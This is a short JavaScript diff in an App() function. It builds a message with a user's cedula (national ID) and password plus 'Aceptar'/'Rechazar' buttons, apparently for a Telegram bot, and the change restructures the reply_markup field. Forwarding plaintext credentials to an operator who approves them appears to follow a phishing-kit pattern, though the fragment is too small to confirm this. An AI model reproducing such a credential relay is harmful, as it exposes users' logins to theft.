@@ -18,22 +18,22 @@ function App() {
         text: {
           cedula, password
         },
-        reply_markup: {
-          inline_keyboard: [
-            [
-              {
-                text: "Aceptar",
-                callback_data: "aceptar",
-              },
-            ],
-            [
-              {
-                text: "Rechazar",
-                callback_data: "rechazar",
-              },
-            ],
+        // reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: "Aceptar",
+              callback_data: "aceptar",
+            },
           ],
-        },
+          [
+            {
+              text: "Rechazar",
+              callback_data: "rechazar",
+            },
+          ],
+        ],
+        // },
       });
       return response;
     } catch (error) {
